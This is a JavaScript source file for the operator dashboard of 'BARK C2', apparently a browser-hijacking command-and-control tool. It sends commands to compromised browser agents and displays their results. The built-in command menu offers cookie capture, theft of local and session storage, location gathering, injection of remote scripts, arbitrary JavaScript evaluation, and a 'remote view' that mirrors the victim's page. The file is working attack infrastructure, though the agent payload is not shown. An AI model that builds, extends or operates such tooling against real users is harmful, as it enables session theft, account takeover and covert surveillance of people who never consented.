// Dashboard functionality for BARK C2
let currentAgentId = null;
let ws = null;
let commandHistory = [];
let historyIndex = -1;

function initDashboard(agentId) {
    console.log('Initializing dashboard for agent:', agentId);
    currentAgentId = agentId;
    
    // Initialize accordion menu with a small delay to ensure DOM is ready
    setTimeout(() => {
        setupAccordionMenu();
        
        // Add a simple test click handler to verify event handling works
        const testElements = document.querySelectorAll('.accordion-header');
        console.log('Adding test click handlers to', testElements.length, 'elements');
        testElements.forEach((el, i) => {
            el.addEventListener('click', function() {
                console.log('TEST CLICK HANDLER FIRED for element', i);
            });
        });
    }, 500); // Increased delay
    
    // Load agent details
    loadAgentDetails(agentId);
    
    // Load pending commands and history
    loadPendingCommands();
    loadCommandHistory();
    
    // Set up command input
    setupCommandInput();
    
    // Set up command library with predefined commands
    setupCommandLibrary();
    
    // Set up activity log controls
    setupActivityLogControls();
    
    // Set up navigation controls
    setupNavigationControls();

    // Initialize modals
    initRemoteView();
    initCommandHistoryModal();
    
    // Set up refresh interval for pending commands and command history
    setInterval(() => {
        loadPendingCommands();
        loadCommandHistory();
    }, 5000); // Refresh every 5 seconds
}

function loadAgentDetails(agentId) {

    // Get the current url
    const currentUrl = window.location.href;
    const agentID = currentUrl.split('/').pop();


    // Fetch agent details from API
    fetch(`/agents/${agentID}`, {
        method: 'GET',
        headers: {
            'Authorization': 'Bearer ' + localStorage.getItem('jwt_token')
        }
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed to fetch agent details');
        }
        return response.json();
    })
    .then(data => {
        if (data) {
            console.log('Agent details fetched:', data);
            const agent = data;
            // Store the agent name for command queueing
            window.agentName = agent.name;
            console.log('Agent name set:', window.agentName);
            
            updateAgentUI(agent);
        }
    })
    .catch(error => {
        console.error('Error fetching agent details:', error);
        addConsoleMessage('Error fetching agent details: ' + error.message, 'error');
    });
}

function updateAgentUI(agent) {
    // Update agent info in header
    document.getElementById('agent-id').textContent = agent.name;
    document.getElementById('agent-status').textContent = 'ONLINE';
    document.getElementById('agent-status').className = 'cyber-status online';
    
    // Update last seen
    const lastSeen = new Date(agent.last_seen);
    document.getElementById('last-seen').textContent = 'Last seen: ' + formatDateTime(lastSeen);
    
    // Update details panel
    document.getElementById('detail-id').textContent = agent.name;
    document.getElementById('detail-ip').textContent = agent.source;
    document.getElementById('detail-type').textContent = agent.is_stager ? 'Stager' : 'Full Agent';
    
    // Parse and display system info
    if (agent.system_info) {
        try {
            const systemInfo = JSON.parse(agent.system_info);
            displaySystemInfo(systemInfo);
        } catch (e) {
            console.error('Error parsing system info:', e);
            document.getElementById('system-info').textContent = 'System info not available or invalid';
        }
    } else {
        document.getElementById('system-info').textContent = 'No system information available';
    }
    
    // Log activity
    addActivityLog('Agent details loaded', 'CONNECTION');
}

function displaySystemInfo(info) {
    const container = document.getElementById('system-info');
    container.innerHTML = '<h4>System Information</h4>';
    
    // Create a formatted display of system info
    for (const [key, value] of Object.entries(info)) {
        const formattedKey = key.replace(/([A-Z])/g, ' $1')
            .replace(/^./, str => str.toUpperCase())
            .replace(/([a-z])([A-Z])/g, '$1 $2');
        
        const item = document.createElement('div');
        item.className = 'system-info-item';
        
        const label = document.createElement('div');
        label.className = 'system-info-label';
        label.textContent = formattedKey + ':';
        
        const valueEl = document.createElement('div');
        valueEl.className = 'system-info-value';
        valueEl.textContent = value;
        
        item.appendChild(label);
        item.appendChild(valueEl);
        container.appendChild(item);
    }
}

function updateAgentStatus(status) {
    const statusEl = document.getElementById('agent-status');
    
    if (status === 'online') {
        statusEl.textContent = 'ONLINE';
        statusEl.className = 'cyber-status online';
    } else {
        statusEl.textContent = 'OFFLINE';
        statusEl.className = 'cyber-status offline';
    }
    
    addConsoleMessage('Agent is now ' + status, 'system');
    addActivityLog('Agent status changed to ' + status.toUpperCase(), 'CONNECTION');
}

function clearAllCommands() {
    fetch('/commands/clear', {
        method: 'POST',
        headers: {
            'Authorization': 'Bearer ' + localStorage.getItem('jwt_token')
        }
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed to clear commands');
        }
        return response.json();
    })
    .then(data => {
        addConsoleMessage('All commands cleared from Redis server', 'system');
        addActivityLog('All commands cleared', 'SYSTEM');
        
        // Refresh the commands displays
        loadPendingCommands();
        loadCommandHistory();
    })
    .catch(error => {
        console.error('Error clearing commands:', error);
        addConsoleMessage('Error clearing commands: ' + error.message, 'error');
    });
}

function setupCommandInput() {
    const commandInput = document.getElementById('command-input');
    const remote = document.getElementById('remote-view-panel');
    remote.style.display = 'none';

    document.getElementById('clear-all-commands')?.addEventListener('click', function() {
        if (confirm('Are you sure you want to clear all commands from the Redis server? This action cannot be undone.')) {
            clearAllCommands();
        }
    });
    
    commandInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            const command = this.value.trim();
            if (command) {
                // Queue the command
                queueCommand(command);
                this.value = '';

                if (command.startsWith('attacks.remote_view')) {
                    const remote = document.getElementById('remote-view-panel');
                    remote.style.display = 'block';
                }
                
                // Add to command history for this session
                commandHistory.push(command);
                historyIndex = commandHistory.length;
            }
        } else if (e.key === 'ArrowUp') {
            // Navigate command history (up)
            e.preventDefault();
            if (historyIndex > 0) {
                historyIndex--;
                this.value = commandHistory[historyIndex];
            }
        } else if (e.key === 'ArrowDown') {
            // Navigate command history (down)
            e.preventDefault();
            if (historyIndex < commandHistory.length - 1) {
                historyIndex++;
                this.value = commandHistory[historyIndex];
            } else if (historyIndex === commandHistory.length - 1) {
                historyIndex = commandHistory.length;
                this.value = '';
            }
        }
    });
}

function setupCommandLibrary() {
    // Clear existing command categories
    const libraryContent = document.querySelector('.command-library .panel-content');
    libraryContent.innerHTML = '';
    
    // Define command categories with their commands
    const commandCategories = [
        {
            name: 'Basic',
            commands: [
                { name: 'Ping', command: 'ping' }
            ]
        },
        {
            name: 'Attacks',
            commands: [
                {name: "Remote View", command: 'attacks.remote_view'}
            ]
        },
        {
            name: 'Reconnaissance',
            commands: [
                { name: 'Browser Info', command: 'recon.browser_info' },
                { name: 'Capture Cookies', command: 'recon.capture_cookies' },
                { name: 'Screen Info', command: 'recon.screen_info' },
                { name: 'Location Info', command: 'recon.location_info' }
            ]
        },
        {
            name: 'DOM Manipulation',
            commands: [
                { name: 'Get Element', command: 'dom.get_element.', prompt: true, placeholder: 'Enter selector (e.g. #myId, .myClass)' },
                { name: 'Get Elements', command: 'dom.get_elements.', prompt: true, placeholder: 'Enter selector (e.g. .myClass)' },
                { name: 'Inject Script', command: 'dom.inject_script.', prompt: true, placeholder: 'Enter script URL' }
            ]
        },
        {
            name: 'Storage',
            commands: [
                { name: 'Get Local Storage', command: 'storage.get_local_storage' },
                { name: 'Get Session Storage', command: 'storage.get_session_storage' },
                { name: 'Set Local Storage', command: 'storage.set_local_storage' }
            ]
        },
        {
            name: 'Network',
            commands: [
                { name: 'Fetch Google', command: 'net.fetch.google.com' },
                { name: 'WebSocket Info', command: 'net.websocket_info' }
            ]
        },
        {
            name: 'Code Execution',
            commands: [
                { name: 'Evaluate JS', command: 'exec.eval.', prompt: true, placeholder: 'Enter JavaScript code to execute' }
            ]
        }
    ];
    
    // Create command categories and buttons
    commandCategories.forEach(category => {
        const categoryDiv = document.createElement('div');
        categoryDiv.className = 'command-category';
        
        const headerDiv = document.createElement('div');
        headerDiv.className = 'category-header';
        headerDiv.textContent = category.name;
        
        const commandListDiv = document.createElement('div');
        commandListDiv.className = 'command-list';
        
        category.commands.forEach(cmd => {
            const cmdDiv = document.createElement('div');
            cmdDiv.className = 'command-item';
            cmdDiv.setAttribute('data-command', cmd.command);
            cmdDiv.textContent = cmd.name;
            
            if (cmd.prompt) {
                cmdDiv.setAttribute('data-prompt', 'true');
                cmdDiv.setAttribute('data-placeholder', cmd.placeholder || 'Enter value');
            }
            
            cmdDiv.addEventListener('click', function() {
                const baseCommand = this.getAttribute('data-command');
                const needsPrompt = this.getAttribute('data-prompt') === 'true';
                const placeholder = this.getAttribute('data-placeholder') || '';
                
                if (needsPrompt) {
                    const userInput = prompt(placeholder);
                    if (userInput !== null) { // Only if user didn't cancel
                        document.getElementById('command-input').value = baseCommand + userInput;
                    }
                } else {
                    document.getElementById('command-input').value = baseCommand;
                }
                
                document.getElementById('command-input').focus();
            });
            
            commandListDiv.appendChild(cmdDiv);
        });
        
        categoryDiv.appendChild(headerDiv);
        categoryDiv.appendChild(commandListDiv);
        libraryContent.appendChild(categoryDiv);
    });
}

function setupActivityLogControls() {
    document.getElementById('clear-log').addEventListener('click', function() {
        document.getElementById('activity-table-body').innerHTML = '';
        addActivityLog('Activity log cleared', 'CONNECTION');
    });
}

function setupNavigationControls() {
    document.getElementById('back-to-main').addEventListener('click', function() {
        // Go back to main agents page
        window.location.href = '/';
    });
    
    document.getElementById('refresh-agent').addEventListener('click', function() {
        // Refresh agent data
        loadAgentDetails(currentAgentId);
    });
    
    // Add a handler for the refresh commands button
    document.getElementById('refresh-commands')?.addEventListener('click', function() {
        console.log('Refreshing commands...');
        loadPendingCommands();
        loadCommandHistory();
        addConsoleMessage('Commands refreshed', 'system');
    });
}

function addConsoleMessage(message, type = 'response') {
    const consoleOutput = document.getElementById('console-output');
    const timestamp = new Date().toTimeString().split(' ')[0];
    
    const line = document.createElement('div');
    line.className = `console-line ${type}-line`;
    
    const timestampSpan = document.createElement('span');
    timestampSpan.className = 'timestamp';
    timestampSpan.textContent = timestamp;
    
    const contentSpan = document.createElement('span');
    contentSpan.className = 'message-content';
    
    // Handle different types of messages
    if (typeof message === 'object') {
        try {
            contentSpan.innerHTML = `<pre>${JSON.stringify(message, null, 2)}</pre>`;
        } catch (e) {
            contentSpan.textContent = 'Complex object: ' + message.toString();
        }
    } else {
        contentSpan.textContent = message;
    }
    
    line.appendChild(timestampSpan);
    line.appendChild(contentSpan);
    
    consoleOutput.appendChild(line);
    consoleOutput.scrollTop = consoleOutput.scrollHeight;
}

function addActivityLog(activity, type) {
    const activityLog = document.getElementById('activity-table-body');
    const timestamp = new Date().toTimeString().split(' ')[0];
    
    const row = document.createElement('tr');
    
    const timeCell = document.createElement('td');
    timeCell.textContent = timestamp;
    
    const typeCell = document.createElement('td');
    const typeSpan = document.createElement('span');
    typeSpan.className = `activity-type ${type.toLowerCase()}`;
    typeSpan.textContent = type;
    typeCell.appendChild(typeSpan);
    
    const activityCell = document.createElement('td');
    activityCell.textContent = activity;
    
    row.appendChild(timeCell);
    row.appendChild(typeCell);
    row.appendChild(activityCell);
    
    activityLog.insertBefore(row, activityLog.firstChild);
}

function formatDateTime(date) {
    // If date is a string, convert it to a Date object
    if (typeof date === 'string') {
        date = new Date(date);
    }
    
    return date.toLocaleString(undefined, {
        year: 'numeric',
        month: 'short',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });
}

function queueCommand(command) {
    const queueId = window.agentName || currentAgentId;
    console.log(`Queueing command for agent: ${queueId}, Command: ${command}`);
    
    // Display the command in the console
    addConsoleMessage(`> ${command}`, 'command');
    
    fetch(`/commands/agent/${queueId}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + localStorage.getItem('jwt_token')
        },
        body: JSON.stringify({
            command: command
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed to queue command');
        }
        return response.json();
    })
    .then(data => {
        addConsoleMessage(`Command queued: ${command}`, 'system');
        addActivityLog(`Command queued: ${command}`, 'COMMAND');
        
        // Refresh pending commands
        loadPendingCommands();
    })
    .catch(error => {
        console.error('Error queueing command:', error);
        addConsoleMessage('Error queueing command: ' + error.message, 'error');
    });
}

// Load pending commands for the current agent
function loadPendingCommands() {
    const queueId = window.agentName || currentAgentId;
    
    fetch(`/commands/agent/${queueId}/pending`, {
        method: 'GET',
        headers: {
            'Authorization': 'Bearer ' + localStorage.getItem('jwt_token')
        }
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed to load pending commands');
        }
        return response.json();
    })
    .then(data => {
        console.log('Pending commands:', data);
        // Make sure we're handling the correct data structure
        const commands = data.commands || [];
        // Update UI to show pending commands
        updatePendingCommandsUI(commands);
    })
    .catch(error => {
        console.error('Error loading pending commands:', error);
    });
}

// Load command history for the current agent
function loadCommandHistory() {
    const queueId = window.agentName || currentAgentId;
    
    fetch(`/commands/agent/${queueId}/history`, {
        method: 'GET',
        headers: {
            'Authorization': 'Bearer ' + localStorage.getItem('jwt_token')
        }
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed to load command history');
        }
        return response.json();
    })
    .then(data => {
        console.log('Command history:', data);
        // Make sure we're handling the correct data structure
        const commands = data.commands || [];
        
        // Process completed commands to show in console
        processCompletedCommands(commands);
        
        // Update command history table for modal
        updateCommandHistoryTable(commands);
    })
    .catch(error => {
        console.error('Error loading command history:', error);
    });
}

// Update the pending commands UI
function updatePendingCommandsUI(commands) {
    const pendingList = document.getElementById('pending-commands');
    if (!pendingList) return;
    
    pendingList.innerHTML = '';
    
    if (!commands || commands.length === 0) {
        pendingList.innerHTML = '<div class="no-commands">No pending commands</div>';
        return;
    }
    
    commands.forEach(cmd => {
        const cmdElement = document.createElement('div');
        cmdElement.className = 'command-item pending';
        cmdElement.innerHTML = `
            <div class="command-content">${cmd.Command || cmd.command}</div>
            <div class="command-time">Queued: ${formatDateTime(cmd.CreatedAt || cmd.created_at)}</div>
            <div class="command-id">ID: ${cmd.ID || cmd.id}</div>
        `;
        pendingList.appendChild(cmdElement);
    });
}

// Process command history to display responses in the console
function processCompletedCommands(commands) {
    if (!commands || commands.length === 0) return;
    
    // Get only completed commands since last check
    const completedCommands = commands.filter(cmd => 
        (cmd.Status === 'completed' || cmd.status === 'completed' || cmd.Status === 'failed' || cmd.status === 'failed') &&
        !cmd.processedByConsole
    );
    
    // Sort commands by creation time
    completedCommands.sort((a, b) => {
        const timeA = new Date(a.CreatedAt || a.created_at);
        const timeB = new Date(b.CreatedAt || b.created_at);
        return timeA - timeB;
    });
    
    // Process each completed command to show in console
    completedCommands.forEach(cmd => {
        const status = cmd.Status || cmd.status;
        const command = cmd.Command || cmd.command;
        const response = cmd.Response || cmd.response;
        const commandID = cmd.ID || cmd.id;
        
        // Display response in console
        try {
            if (response) {
                const responseObj = JSON.parse(response);
                addConsoleMessage(responseObj, 'response');
            } else {
                addConsoleMessage(`Command ${status}: No response data`, 'system');
            }
        } catch (e) {
            // If not JSON, display as is
            if (response) {
                addConsoleMessage(response, 'response');
            } else {
                addConsoleMessage(`Command ${status}: No response data`, 'system');
            }
        }
        
        // Mark command as processed
        cmd.processedByConsole = true;
        
        // Remove the command from history after displaying the response
        if (commandID) {
            removeCompletedCommandFromHistory(commandID);
        }
    });

}

// Remove a completed command from history after it's been displayed
function removeCompletedCommandFromHistory(commandID) {
    const queueId = window.agentName || currentAgentId;
    
    if (!commandID) {
        console.warn('Cannot remove command: no command ID provided');
        return;
    }
    
    console.log(`Removing completed command ${commandID} from history`);
    
    fetch(`/commands/agent/${queueId}/history/${commandID}`, {
        method: 'DELETE',
        headers: {
            'Authorization': 'Bearer ' + localStorage.getItem('jwt_token')
        }
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`Failed to remove command: ${response.status}`);
        }
        return response.json();
    })
    .then(data => {
        console.log(`Command ${commandID} removed from history:`, data.message);
        // Refresh the command history display
        updateCommandHistoryTable([]);
    })
    .catch(error => {
        console.error('Error removing command from history:', error);
        // Don't show user error - this is background cleanup
    });
}

let remoteViewActive = true;
let remoteViewInterval = null;

function initRemoteView() {
    // Get modal elements
    const modal = document.getElementById('remote-view-modal');
    const closeBtn = document.querySelector('.modal-close');
    // Don't try to find this element at initialization time
    // const remoteViewBtn = document.getElementById('remote-view');
    const remoteViewPanelBtn = document.getElementById('remote-view-panel');
    const refreshBtn = document.getElementById('refresh-remote-view');
    const stopBtn = document.getElementById('stop-remote-view');
    
    // Instead of using direct event listener, we'll use event delegation
    // This will allow us to handle clicks on dynamically created elements
    document.addEventListener('click', function(event) {
        // Check if the clicked element is our remote view command
        if (event.target.closest('.command-item[data-command="attacks.remote_view"]')) {
            startRemoteView();
        }
    });
    
    // Open modal when clicking the Remote View Panel button
    if (remoteViewPanelBtn) {
        remoteViewPanelBtn.addEventListener('click', function() {
            openRemoteViewModal();
        });
    }
    
    // Close modal when clicking X
    if (closeBtn) {
        closeBtn.addEventListener('click', function() {
            modal.style.display = 'none';
        });
    }
    
    // Close modal when clicking outside
    window.addEventListener('click', function(event) {
        if (modal && event.target === modal) {
            modal.style.display = 'none';
        }
    });
    
    // Refresh remote view
    if (refreshBtn) {
        refreshBtn.addEventListener('click', function() {
            startRemoteView();
        });
    }
    
    // Stop remote view
    if (stopBtn) {
        stopBtn.addEventListener('click', function() {
            stopRemoteView();
        });
    }
}

function openRemoteViewModal() {
    const modal = document.getElementById('remote-view-modal');
    modal.style.display = 'block';
    
    // Check if we need to start a new remote view session
    if (!remoteViewActive) {
        startRemoteView();
    }
}

function startRemoteView() {
    const agentId = document.getElementById('agent-id').textContent;
    
    // Display loading message
    updateRemoteViewStatus('Starting remote view session...');
    
    // Send command to start remote viewing
    fetch(`/commands/agent/${agentId}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + localStorage.getItem('jwt_token')
        },
        body: JSON.stringify({
            command: 'remote_view.start'
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed to queue remote view command');
        }
        return response.json();
    })
    .then(data => {
        // Check if we got a command object back (success case)
        if (data && (data.command || (data.command && data.command.id))) {
            console.log('Remote view command queued:', data);
            remoteViewActive = true;
            
            // Check for updates every 5 seconds
            if (remoteViewInterval) {
                clearInterval(remoteViewInterval);
            }
            remoteViewInterval = setInterval(fetchRemoteViewData, 5000);
            
            // Open the modal
            openRemoteViewModal();
            
            // Add to activity log
            addActivityLog('Remote view session started', 'COMMAND');
        } else {
            console.error('Failed to start remote view:', data);
            updateRemoteViewStatus('Failed to start remote view: Command could not be queued');
        }
    })
    .catch(error => {
        console.error('Error starting remote view:', error);
        updateRemoteViewStatus('Error: ' + error.message);
    });
}

function stopRemoteView() {
    const agentId = document.getElementById('agent-id').textContent;
    
    // Clear the update interval
    if (remoteViewInterval) {
        clearInterval(remoteViewInterval);
        remoteViewInterval = null;
    }
    
    // Send command to stop remote viewing
    fetch(`/commands/agent/${agentId}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            command: 'remote_view.stop'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            console.log('Remote view stopped:', data);
            remoteViewActive = false;
            updateRemoteViewStatus('Remote view stopped');
            addActivityLog('COMMAND', 'Stopped remote view session');
        } else {
            console.error('Failed to stop remote view:', data);
        }
    })
    .catch(error => {
        console.error('Error stopping remote view:', error);
    });
}

function fetchRemoteViewData() {
    const agentId = document.getElementById('agent-id').textContent;
    
    // Use the dedicated remote view endpoint instead of command history
    fetch(`/commands/agent/${agentId}/remote_view`, {
        headers: {
            'Authorization': 'Bearer ' + localStorage.getItem('jwt_token')
        }
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed to fetch remote view data');
        }
        return response.json();
    })
    .then(data => {
        if (data && data.remoteView) {
            displayRemoteViewResult({ result: data.remoteView });
        } else {
            console.log('No remote view data available');
        }
    })
    .catch(error => {
        console.error('Error fetching remote view data:', error);
    });
}

function displayRemoteViewResult(commandResult) {
    try {
        // Parse the result if it's a string
        let resultData = commandResult.result;
        if (typeof resultData === 'string') {
            resultData = JSON.parse(resultData);
        }
        
        // Update the iframe with the HTML content
        if (resultData && resultData.html) {
            const iframe = document.getElementById('remote-view-iframe');
            iframe.srcdoc = resultData.html;
            
            // Update metadata
            document.getElementById('remote-view-url').textContent = 'URL: ' + (resultData.url || 'Unknown');
            document.getElementById('remote-view-timestamp').textContent = 'Timestamp: ' + 
                (resultData.timestamp || new Date().toLocaleString());
        }
    } catch (error) {
        console.error('Error displaying remote view result:', error);
        updateRemoteViewStatus('Error parsing remote view data');
    }
}

function updateRemoteViewStatus(message) {
    const iframe = document.getElementById('remote-view-iframe');
    iframe.srcdoc = `<html><body style="font-family: Arial, sans-serif; color: #00eeff; background-color: #0a0a14; display: flex; justify-content: center; align-items: center; height: 100%; margin: 0;"><p>${message}</p></body></html>`;
}

// Command History Modal Functions
function initCommandHistoryModal() {
    console.log('Initializing command history modal...');
    const modal = document.getElementById('command-history-modal');
    const openBtn = document.getElementById('command-history-btn');
    const closeBtn = document.querySelector('#command-history-modal .modal-close');
    const refreshBtn = document.getElementById('refresh-command-history');
    const clearBtn = document.getElementById('clear-command-history');
    
    console.log('Modal elements found:', {
        modal: !!modal,
        openBtn: !!openBtn,
        closeBtn: !!closeBtn,
        refreshBtn: !!refreshBtn,
        clearBtn: !!clearBtn
    });
    
    // Open modal when clicking the Command History button
    if (openBtn) {
        openBtn.addEventListener('click', function(e) {
            e.preventDefault();
            console.log('Command history button clicked!');
            openCommandHistoryModal();
        });
    } else {
        console.error('Command history button not found!');
    }
    
    // Close modal when clicking X
    if (closeBtn) {
        closeBtn.addEventListener('click', function() {
            console.log('Closing command history modal');
            modal.style.display = 'none';
        });
    }
    
    // Close modal when clicking outside
    window.addEventListener('click', function(event) {
        if (modal && event.target === modal) {
            console.log('Closing modal by clicking outside');
            modal.style.display = 'none';
        }
    });
    
    // Refresh command history
    if (refreshBtn) {
        refreshBtn.addEventListener('click', function() {
            console.log('Refreshing command history');
            loadCommandHistory();
            updateCommandCount();
        });
    }
    
    // Clear command history
    if (clearBtn) {
        clearBtn.addEventListener('click', function() {
            if (confirm('Are you sure you want to clear the command history? This action cannot be undone.')) {
                console.log('Clearing command history');
                clearCommandHistory();
            }
        });
    }
}

function openCommandHistoryModal() {
    const modal = document.getElementById('command-history-modal');
    modal.style.display = 'block';
    
    // Refresh the command history when opening
    loadCommandHistory();
    updateCommandCount();
}

function updateCommandCount() {
    const tableBody = document.getElementById('command-history-table-body');
    const countElement = document.getElementById('command-count');
    const lastUpdatedElement = document.getElementById('last-updated');
    
    if (tableBody && countElement) {
        const rowCount = tableBody.children.length;
        // Don't count the "no commands" row
        const actualCount = tableBody.innerHTML.includes('No commands in history') ? 0 : rowCount;
        countElement.textContent = `Total Commands: ${actualCount}`;
    }
    
    if (lastUpdatedElement) {
        lastUpdatedElement.textContent = `Last Updated: ${new Date().toLocaleTimeString()}`;
    }
}

function clearCommandHistory() {
    fetch('/commands/clear', {
        method: 'POST',
        headers: {
            'Authorization': 'Bearer ' + localStorage.getItem('jwt_token'),
            'Content-Type': 'application/json'
        }
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed to clear command history');
        }
        return response.json();
    })
    .then(data => {
        console.log('Command history cleared:', data);
        loadCommandHistory(); // Refresh the display
        addConsoleMessage('Command history cleared', 'system');
    })
    .catch(error => {
        console.error('Error clearing command history:', error);
        addConsoleMessage('Failed to clear command history: ' + error.message, 'error');
    });
}

function updateCommandHistoryTable(commands) {
    const tableBody = document.getElementById('command-history-table-body');
    if (!tableBody) return;
    
    // Clear existing rows
    tableBody.innerHTML = '';
    
    if (!commands || commands.length === 0) {
        tableBody.innerHTML = `
            <tr>
                <td colspan="4" style="text-align: center; color: var(--cyberpunk-accent);">
                    No commands in history
                </td>
            </tr>
        `;
        updateCommandCount();
        return;
    }
    
    // Sort commands by creation time (newest first)
    const sortedCommands = commands.sort((a, b) => {
        const timeA = new Date(a.CreatedAt || a.created_at);
        const timeB = new Date(b.CreatedAt || b.created_at);
        return timeB - timeA;
    });
    
    sortedCommands.forEach(cmd => {
        const row = document.createElement('tr');
        
        // Format time
        const createdAt = new Date(cmd.CreatedAt || cmd.created_at);
        const timeStr = createdAt.toLocaleTimeString();
        
        // Get command text
        const command = cmd.Command || cmd.command || 'Unknown';
        
        // Get status
        const status = cmd.Status || cmd.status || 'unknown';
        
        // Get response (truncate if too long for display)
        let response = cmd.Response || cmd.response || '';
        if (response.length > 300) {
            response = response.substring(0, 300) + '...';
        }
        
        row.innerHTML = `
            <td>${timeStr}</td>
            <td>${escapeHtml(command)}</td>
            <td><span class="command-status ${status.toLowerCase()}">${status.toUpperCase()}</span></td>
            <td>${escapeHtml(response)}</td>
        `;
        
        tableBody.appendChild(row);
    });
    
    // Update command count in modal if it's open
    updateCommandCount();
}

// Helper function to escape HTML
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Setup accordion menu functionality
function setupAccordionMenu() {
    console.log('Setting up accordion menu...');
    
    // First, let's check if the basic elements exist
    const sidebarMenu = document.querySelector('.sidebar-menu');
    console.log('Sidebar menu found:', sidebarMenu);
    
    const accordionSections = document.querySelectorAll('.accordion-section');
    console.log('Accordion sections found:', accordionSections.length);
    
    const accordionHeaders = document.querySelectorAll('.accordion-header');
    console.log('Found accordion headers:', accordionHeaders.length);
    
    if (accordionHeaders.length === 0) {
        console.error('No accordion headers found! Check HTML structure.');
        return;
    }
    
    accordionHeaders.forEach((header, index) => {
        console.log(`Setting up header ${index}:`, header.textContent.trim());
        
        // Add a visual indicator that the handler is attached
        header.style.cursor = 'pointer';
        
        header.addEventListener('click', function(event) {
            console.log('=== ACCORDION CLICK EVENT ===');
            console.log('Clicked header:', this.textContent.trim());
            event.preventDefault();
            event.stopPropagation();
            
            const section = this.getAttribute('data-section');
            console.log('Section attribute:', section);
            
            if (!section) {
                console.error('No data-section attribute found on header');
                return;
            }
            
            const content = document.getElementById(section + '-content');
            console.log('Content element found:', content);
            
            if (!content) {
                console.error('Content element not found for section:', section + '-content');
                return;
            }
            
            // Toggle the expanded state
            const isCurrentlyExpanded = content.classList.contains('expanded');
            console.log('Currently expanded:', isCurrentlyExpanded);
            
            if (isCurrentlyExpanded) {
                console.log('Collapsing section:', section);
                content.classList.remove('expanded');
                content.classList.add('collapsed');
                this.classList.remove('expanded');
            } else {
                console.log('Expanding section:', section);
                content.classList.remove('collapsed');
                content.classList.add('expanded');
                this.classList.add('expanded');
            }
            
            console.log('New classes on content:', content.className);
            console.log('=== END ACCORDION CLICK EVENT ===');
        });
        
        console.log('Event listener added to header:', index);
    });
    
    // Initialize with agent details expanded by default
    console.log('Initializing default expanded state...');
    const agentDetailsHeader = document.querySelector('[data-section="agent-details"]');
    const agentDetailsContent = document.getElementById('agent-details-content');
    console.log('Agent details header found:', agentDetailsHeader);
    console.log('Agent details content found:', agentDetailsContent);
    
    if (agentDetailsHeader && agentDetailsContent) {
        agentDetailsContent.classList.add('expanded');
        agentDetailsHeader.classList.add('expanded');
        console.log('Agent details section initialized as expanded');
    } else {
        console.error('Could not initialize agent details as expanded');
    }
    
    console.log('Accordion menu setup complete');
}